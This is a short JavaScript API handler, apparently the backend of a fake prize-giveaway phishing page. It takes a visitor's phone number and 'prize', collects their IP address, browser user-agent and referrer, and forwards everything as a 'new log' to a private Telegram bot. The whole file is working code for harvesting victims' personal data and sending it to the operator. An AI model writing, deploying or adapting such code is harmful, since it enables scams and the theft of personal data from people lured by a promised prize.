export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  try {
    const { phone, prize } = req.body;

    // Время (по UTC, можно потом сдвинуть под свой часовой пояс)
    const now = new Date();
    const time = now.toLocaleString("ru-RU", { timeZone: "Asia/Almaty" });

    // IP (из заголовка)
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;

    // User-Agent (браузер/устройство)
    const ua = req.headers["user-agent"] || "неизвестно";

    // Referer (откуда пришёл человек)
    const referer = req.headers["referer"] || "прямой заход";

    // Сообщение для Telegram
    const text = `
✅ Новый лог
📞 Номер: ${phone}
🎁 Приз: ${prize}
⏰ Время: ${time}
🌍 IP: ${ip}
🖥️ Устройство: ${ua}
🔗 Источник: ${referer}
    `;

    // Отправка в Telegram
    await fetch(
      `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.CHAT_ID,
          text,
          parse_mode: "HTML",
        }),
      }
    );

    return res.status(200).json({ ok: true });
  } catch (err) {
    console.error("Ошибка в логах:", err);
    return res.status(500).json({ error: "Internal Server Error" });
  }
}
